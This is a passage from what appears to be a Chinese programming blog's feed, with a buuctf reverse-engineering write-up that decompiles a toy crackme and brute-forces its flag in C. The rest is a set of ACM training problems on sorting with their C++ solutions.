&#125;<br>    cout&lt;&lt;cow&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> NEFUOJ </tag>
            
            <tag> 暴力 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-RE-SimpleRev</title>
      <link href="/2020/12/5276d88d.html"/>
      <url>/2020/12/5276d88d.html</url>
      
        <content type="html"><![CDATA[<h1 id="IDA-打开"><a href="#IDA-打开" class="headerlink" title="IDA 打开"></a>IDA 打开</h1><p>将main函数反编译为C代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c++"> <span class="hljs-number">1</span> <span class="hljs-function"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"> 2 </span>&#123;<br> <span class="hljs-number">3</span>   <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br> <span class="hljs-number">4</span>   <span class="hljs-type">char</span> v4; <span class="hljs-comment">// [rsp+Fh] [rbp-1h]</span><br> <span class="hljs-number">5</span> <br> <span class="hljs-number">6</span>   <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br> <span class="hljs-number">7</span>   &#123;<br> <span class="hljs-number">8</span>     <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br> <span class="hljs-number">9</span>     &#123;<br><span class="hljs-number">10</span>       <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to CTF game!\nPlease input d/D to start or input q/Q to quit this program: &quot;</span>, argv, envp);<br><span class="hljs-number">11</span>       v4 = <span class="hljs-built_in">getchar</span>();<br><span class="hljs-number">12</span>       <span class="hljs-keyword">if</span> ( v4 != <span class="hljs-string">&#x27;d&#x27;</span> &amp;&amp; v4 != <span class="hljs-string">&#x27;D&#x27;</span> )<br><span class="hljs-number">13</span>         <span class="hljs-keyword">break</span>;<br><span class="hljs-number">14</span>       <span class="hljs-built_in">Decry</span>();<br><span class="hljs-number">15</span>     &#125;<br><span class="hljs-number">16</span>     <span class="hljs-keyword">if</span> ( v4 == <span class="hljs-string">&#x27;q&#x27;</span> || v4 == <span class="hljs-string">&#x27;Q&#x27;</span> )<br><span class="hljs-number">17</span>       <span class="hljs-built_in">Exit</span>();<br><span class="hljs-number">18</span>     <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input fault format!&quot;</span>);<br><span class="hljs-number">19</span>     v3 = <span class="hljs-built_in">getchar</span>();<br><span class="hljs-number">20</span>     <span class="hljs-built_in">putchar</span>(v3);<br><span class="hljs-number">21</span>   &#125;<br><span class="hljs-number">22</span> &#125;<br></code></pre></td></tr></table></figure><h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p>这道题的关键在于Decry()</p><blockquote><p>1 unsigned __int64 Decry()<br> 2 {<br> 3   char v1; &#x2F;&#x2F; [rsp+Fh] [rbp-51h]<br> 4   int v2; &#x2F;&#x2F; [rsp+10h] [rbp-50h]<br> 5   int v3; &#x2F;&#x2F; [rsp+14h] [rbp-4Ch]<br> 6   int i; &#x2F;&#x2F; [rsp+18h] [rbp-48h]<br> 7   int v5; &#x2F;&#x2F; [rsp+1Ch] [rbp-44h]<br> 8   char src[8]; &#x2F;&#x2F; [rsp+20h] [rbp-40h]<br> 9   __int64 v7; &#x2F;&#x2F; [rsp+28h] [rbp-38h]<br>10   int v8; &#x2F;&#x2F; [rsp+30h] [rbp-30h]<br>11   __int64 v9; &#x2F;&#x2F; [rsp+40h] [rbp-20h]<br>12   __int64 v10; &#x2F;&#x2F; [rsp+48h] [rbp-18h]<br>13   int v11; &#x2F;&#x2F; [rsp+50h] [rbp-10h]<br>14   unsigned __int64 v12; &#x2F;&#x2F; [rsp+58h] [rbp-8h]<br>15<br>16   v12 &#x3D; __readfsqword(0x28u);<br>17   *(_QWORD *)src &#x3D; ‘SLCDN’;<br>18   v7 &#x3D; 0LL;<br>19   v8 &#x3D; 0;<br>20   v9 &#x3D; ‘wodah’;<br>21   v10 &#x3D; 0LL;<br>22   v11 &#x3D; 0;<br>23   text &#x3D; join(key3, (const char *)&amp;v9);         &#x2F;&#x2F; text &#x3D; ‘killshadow’<br>24   strcpy(key, key1);<br>25   strcat(key, src);                             &#x2F;&#x2F; key &#x3D; ‘ADSFKNDCLS’<br>26   v2 &#x3D; 0;<br>27   v3 &#x3D; 0;<br>28   getchar();<br>29   v5 &#x3D; strlen(key);                             &#x2F;&#x2F; v5 &#x3D; 10<br>30   for ( i &#x3D; 0; i &lt; v5; ++i )<br>31   {<br>32     if ( key[v3 % v5] &gt; 64 &amp;&amp; key[v3 % v5] &lt;&#x3D; 90 )&#x2F;&#x2F; key &#x3D; ‘adsfkndcls’<br>33       key[i] &#x3D; key[v3 % v5] + 32;<br>34     ++v3;<br>35   }<br>36   printf(“Please input your flag:”, src);<br>37   while ( 1 )<br>38   {<br>39     v1 &#x3D; getchar();<br>40     if ( v1 &#x3D;&#x3D; 10 )<br>41       break;<br>42     if ( v1 &#x3D;&#x3D; 32 )<br>43     {<br>44       ++v2;<br>45     }<br>46     else<br>47     {<br>48       if ( v1 &lt;&#x3D; 96 || v1 &gt; 122 )<br>49       {<br>50         if ( v1 &gt; 64 &amp;&amp; v1 &lt;&#x3D; 90 )              &#x2F;&#x2F; 大写字母<br>51           str2[v2] &#x3D; (v1 - 39 - key[v3++ % v5] + 97) % 26 + 97;<br>52       }<br>53       else                                      &#x2F;&#x2F; 小写字母<br>54       {<br>55         str2[v2] &#x3D; (v1 - 39 - key[v3++ % v5] + 97) % 26 + 97;<br>56       }<br>57       if ( !(v3 % v5) )<br>58         putchar(‘ ‘);<br>59       ++v2;<br>60     }<br>61   }<br>62   if ( !strcmp(text, str2) )<br>63     puts(“Congratulation!\n”);<br>64   else<br>65     puts(“Try again!\n”);<br>66   return __readfsqword(0x28u) ^ v12;<br>67 }</p></blockquote><p>转为C语言逆向解出结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span> </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">char</span> key[] = <span class="hljs-string">&quot;adsfkndcls&quot;</span>;<br><span class="hljs-type">char</span> text[] = <span class="hljs-string">&quot;killshadow&quot;</span>;<br><span class="hljs-type">int</span> i;<br><span class="hljs-type">int</span> v3=<span class="hljs-number">10</span>;<span class="hljs-comment">//长度 </span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">128</span>; j++)<br>&#123;<br><span class="hljs-keyword">if</span> (j &lt; <span class="hljs-string">&#x27;A&#x27;</span> || j &gt; <span class="hljs-string">&#x27;z&#x27;</span> || j &gt; <span class="hljs-string">&#x27;Z&#x27;</span> &amp;&amp; j &lt; <span class="hljs-string">&#x27;a&#x27;</span>)<br>&#123;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">if</span> ((j - <span class="hljs-number">39</span> - key[v3 % <span class="hljs-number">10</span>] + <span class="hljs-number">97</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">97</span> == text[i])<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,j);<br>v3++;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>得到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACM-NEFU新生训练2-排序和CMP</title>
      <link href="/2020/12/cd7c5106.html"/>
      <url>/2020/12/cd7c5106.html</url>
      
        <content type="html"><![CDATA[<h1 id="A-谁考了第k名-排序"><a href="#A-谁考了第k名-排序" class="headerlink" title="A.谁考了第k名-排序"></a>A.谁考了第k名-排序</h1><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">在一次考试中，每个学生的成绩都不相同，现知道了每个学生的学号和成绩，求考第k名学生的学号和成绩。<br></code></pre></td></tr></table></figure><h3 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel">第一行有两个整数，分别是学生的人数<span class="hljs-built_in">n</span>（<span class="hljs-number">1</span>≤<span class="hljs-built_in">n</span>≤<span class="hljs-number">100</span>），和求第k名学生的k（<span class="hljs-number">1</span>≤k≤<span class="hljs-built_in">n</span>）。<br>其后有<span class="hljs-built_in">n</span>行数据，每行包括一个学号（整数）和一个成绩（浮点数），中间用一个空格分隔。<br></code></pre></td></tr></table></figure><h3 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h3><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">输出第<span class="hljs-keyword">k</span>名学生的学号和成绩，中间用空格分隔。（注：请用<span class="hljs-built_in">%g</span>输出成绩）<br></code></pre></td></tr></table></figure><h3 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input"></a>Sample Input</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">5 </span><span class="hljs-number">3</span><br><span class="hljs-symbol">90788001 </span><span class="hljs-number">67.8</span><br><span class="hljs-symbol">90788002 </span><span class="hljs-number">90.3</span><br><span class="hljs-symbol">90788003 </span><span class="hljs-number">61</span><br><span class="hljs-symbol">90788004 </span><span class="hljs-number">68.4</span><br><span class="hljs-symbol">90788005 </span><span class="hljs-number">73.9</span><br></code></pre></td></tr></table></figure><h3 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">90788004 </span><span class="hljs-number">68.4</span><br></code></pre></td></tr></table></figure><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">student</span><br>&#123;<br><span class="hljs-type">int</span> num;<br><span class="hljs-type">double</span> grade;<br>&#125;s[<span class="hljs-number">100</span>];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">cmp</span><span class="hljs-params">(student s1,student s2)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> s1.grade&gt;s2.grade;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n,k;<br>cin&gt;&gt;n&gt;&gt;k;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>&#123;<br>cin&gt;&gt;s[i].num&gt;&gt;s[i].grade;<br>&#125;<br><span class="hljs-built_in">sort</span>(s,s+n,cmp);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %g&quot;</span>,s[k<span class="hljs-number">-1</span>].num,s[k<span class="hljs-number">-1</span>].grade);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="B-奇数单增序列"><a href="#B-奇数单增序列" class="headerlink" title="B.奇数单增序列"></a>B.奇数单增序列</h1><h3 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">给定一个长度为<span class="hljs-built_in">N</span>（不大于<span class="hljs-number">500</span>）的正整数序列，请将其中的所有奇数取出，并按升序输出<br></code></pre></td></tr></table></figure><h3 id="Input-1"><a href="#Input-1" class="headerlink" title="Input"></a>Input</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs excel">共<span class="hljs-number">2</span>行：<br>第<span class="hljs-number">1</span>行为 <span class="hljs-built_in">N</span>；<br>第<span class="hljs-number">2</span>行为 <span class="hljs-built_in">N</span> 个正整数，其间用空格间隔。<br></code></pre></td></tr></table></figure><h3 id="Output-1"><a href="#Output-1" class="headerlink" title="Output"></a>Output</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">增序输出的奇数序列，数据之间以逗号间隔。数据保证至少有一个奇数。<br></code></pre></td></tr></table></figure><h3 id="Sample-Input-1"><a href="#Sample-Input-1" class="headerlink" title="Sample Input"></a>Sample Input</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">10</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">3</span> <span class="hljs-number">2</span> <span class="hljs-number">6</span> <span class="hljs-number">5</span> <span class="hljs-number">4</span> <span class="hljs-number">9</span> <span class="hljs-number">8</span> <span class="hljs-number">7</span> <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><h3 id="Sample-Output-1"><a href="#Sample-Output-1" class="headerlink" title="Sample Output"></a>Sample Output</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">7</span>,<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n,num[<span class="hljs-number">500</span>],flag=<span class="hljs-number">1</span>;<br>cin&gt;&gt;n;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>&#123;<br>cin&gt;&gt;num[i];<br>&#125;<br><span class="hljs-built_in">sort</span>(num,num+n);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>&#123;<br><span class="hljs-keyword">if</span>(num[i]%<span class="hljs-number">2</span>)<br>&#123;<br><span class="hljs-keyword">if</span>(!flag)<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;,&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,num[i]);<br>flag=<span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="C-成绩排序"><a href="#C-成绩排序" class="headerlink" title="C.成绩排序"></a>C.成绩排序</h1><h3 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">给出班里某门课程的成绩单，请你按成绩从高到低对成绩单排序输出，如果有相同分数则名字字典序小的在前。<br></code></pre></td></tr></table></figure><h3 id="Input-2"><a href="#Input-2" class="headerlink" title="Input"></a>Input</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel">第一行为<span class="hljs-built_in">n</span> (<span class="hljs-number">0</span> &amp;lt; <span class="hljs-built_in">n</span> &amp;lt; <span class="hljs-number">20</span>)，表示班里的学生数目；<br>接下来的<span class="hljs-built_in">n</span>行，每行为每个学生的名字和他的成绩, 中间用单个空格隔开。名字只包含字母且长度不超过<span class="hljs-number">20</span>，成绩为一个不大于<span class="hljs-number">100</span>的非负整数。<br></code></pre></td></tr></table></figure><h3 id="Output-2"><a href="#Output-2" class="headerlink" title="Output"></a>Output</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">把成绩单按分数从高到低的顺序进行排序并输出，每行包含名字和分数两项，之间有一个空格。<br></code></pre></td></tr></table></figure><h3 id="Sample-Input-2"><a href="#Sample-Input-2" class="headerlink" title="Sample Input"></a>Sample Input</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">4</span><br><span class="hljs-attribute">Kitty</span> <span class="hljs-number">80</span><br><span class="hljs-attribute">Hanmeimei</span> <span class="hljs-number">90</span><br><span class="hljs-attribute">Joey</span> <span class="hljs-number">92</span><br><span class="hljs-attribute">Tim</span> <span class="hljs-number">28</span><br></code></pre></td></tr></table></figure><h3 id="Sample-Output-2"><a href="#Sample-Output-2" class="headerlink" title="Sample Output"></a>Sample Output</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Joey</span> <span class="hljs-number">92</span><br><span class="hljs-attribute">Hanmeimei</span> <span class="hljs-number">90</span> <br><span class="hljs-attribute">Kitty</span> <span class="hljs-number">80</span><br><span class="hljs-attribute">Tim</span> <span class="hljs-number">28</span><br></code></pre></td></tr></table></figure><h2 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">student</span><br>&#123;<br><span class="hljs-type">char</span> name[<span class="hljs-number">30</span>];<br><span class="hljs-type">int</span> grade;<br>&#125;a[<span class="hljs-number">50</span>];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">cmp</span><span class="hljs-params">(student s1,student s2)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span>(s1.grade!=s2.grade)<span class="hljs-keyword">return</span> s1.grade&gt;s2.grade;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-built_in">strcmp</span>(s1.name,s2.name)&lt;<span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n;<br>cin&gt;&gt;n;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>&#123;<br>cin&gt;&gt;a[i].name&gt;&gt;a[i].grade;<br>&#125;<br><span class="hljs-built_in">sort</span>(a,a+n,cmp);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>&#123;<br>cout&lt;&lt;a[i].name&lt;&lt;<span class="hljs-string">&quot; &quot;</span>&lt;&lt;a[i].grade&lt;&lt;endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="D-没必要的排序1"><a href="#D-没必要的排序1" class="headerlink" title="D.没必要的排序1"></a>D.没必要的排序1</h1><h3 id="Description-3"><a href="#Description-3" class="headerlink" title="Description"></a>Description</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">羽裳有<span class="hljs-built_in">n</span>个数，她想知道前k大的数的和为多少<br></code></pre></td></tr></table></figure><h3 id="Input-3"><a href="#Input-3" class="headerlink" title="Input"></a>Input</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel">首先输入两个数<span class="hljs-built_in">n</span>，k，代表有<span class="hljs-built_in">n</span>个数，求前k大的和，接下来输入<span class="hljs-built_in">n</span>个数，这<span class="hljs-built_in">n</span>个数或是<span class="hljs-number">0</span>或是<span class="hljs-number">1</span>.<br><span class="hljs-number">1</span>&amp;lt;=k&amp;lt;=<span class="hljs-built_in">n</span>&amp;lt;=<span class="hljs-number">1000</span><br></code></pre></td></tr></table></figure><h3 id="Output-3"><a href="#Output-3" class="headerlink" title="Output"></a>Output</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">输出一个数，为前k大的和<br></code></pre></td></tr></table></figure><h3 id="Sample-Input-3"><a href="#Sample-Input-3" class="headerlink" title="Sample Input"></a>Sample Input</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">5 </span><span class="hljs-number">3</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="Sample-Output-3"><a href="#Sample-Output-3" class="headerlink" title="Sample Output"></a>Sample Output</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">2<br></code></pre></td></tr></table></figure><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n,k,cnt=<span class="hljs-number">0</span>,tmp;<br><span class="hljs-keyword">while</span>(cin&gt;&gt;n&gt;&gt;k)<br>&#123;<br>cnt=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>&#123;<br>cin&gt;&gt;tmp;<br><span class="hljs-keyword">if</span>(tmp)cnt++;<br>&#125;<br><span class="hljs-keyword">if</span>(cnt&lt;k)cout&lt;&lt;cnt&lt;&lt;endl;<br><span class="hljs-keyword">else</span> cout&lt;&lt;k&lt;&lt;endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="E-没必要的排序2"><a href="#E-没必要的排序2" class="headerlink" title="E.没必要的排序2"></a>E.没必要的排序2</h1><h3 id="Description-4"><a href="#Description-4" class="headerlink" title="Description"></a>Description</h3><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">羽裳有<span class="hljs-built_in">n</span>个数，她想知道前k大的数的和是多少<br></code></pre></td></tr></table></figure><h3 id="Input-4"><a href="#Input-4" class="headerlink" title="Input"></a>Input</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">输入n，k代表有n个数，求前k大的和,之后输入n个数，第i个数为a[i]<br>1<span class="hljs-symbol">&amp;lt;</span>=n<span class="hljs-symbol">&amp;lt;</span>=10000000(1e7)<br>1<span class="hljs-symbol">&amp;lt;</span>=k<span class="hljs-symbol">&amp;lt;</span>1000<br>对任意的i<br>1<span class="hljs-symbol">&amp;lt;</span>=a[i]<span class="hljs-symbol">&amp;lt;</span>=100000(1e5)<br></code></pre></td></tr></table></figure><h3 id="Output-4"><a href="#Output-4" class="headerlink" title="Output"></a>Output</h3><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs matlab">输出一个数<span class="hljs-built_in">ans</span>，<span class="hljs-built_in">ans</span>是前k大数的和<br></code></pre></td></tr></table></figure><h3 id="Sample-Input-4"><a href="#Sample-Input-4" class="headerlink" title="Sample Input"></a>Sample Input</h3><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">2 </span><span class="hljs-number">1</span><br><span class="hljs-symbol">99999 </span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="Sample-Output-4"><a href="#Sample-Output-4" class="headerlink" title="Sample Output"></a>Sample Output</h3><figure 